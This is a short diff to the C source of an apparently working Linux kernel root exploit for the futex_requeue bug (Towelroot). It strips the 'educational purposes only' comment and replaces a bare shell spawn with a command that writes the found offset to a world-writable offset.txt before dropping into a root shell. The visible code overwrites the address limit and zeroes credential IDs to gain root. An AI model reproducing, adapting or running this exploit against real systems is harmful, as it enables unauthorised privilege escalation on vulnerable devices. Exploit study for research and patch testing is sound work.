@@ -17,8 +17,6 @@
  * for in depth explanation:
  * http://solidwrench.blogspot.com/2014/07/futexrequeue-part-3-towelroot-source.html
  *
- *
- * For educational purposes only.
  */
 
 #define _GNU_SOURCE  
@@ -106,6 +104,7 @@ ssize_t write_kern(void *readbuf, void *writebuf, size_t count) {
 void *ger(void *arg){
 	int sem_id;
 	void *task_struct,*cred;
+	char buf[256];
 	const char new_addr_limit[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 	const char new_egideuid[] = {0,0,0,0};
 	printf("ger thread\n");
@@ -142,8 +141,9 @@ void *ger(void *arg){
 	futex_wait_requeue_pi(NULL, 0, NULL, NULL, 0); 
 
 	if(geteuid() != 0) printf("not root :(\n");
-	system("sh");
-
+	sprintf(buf,"sh -c \"echo success %d > offset.txt && chmod 777 offset.txt && sh \"",WAITER_OVERWRITE_OFFSET);
+	system(buf);
+	
 	printf("ger function exiting\n");
 	return NULL;
 	
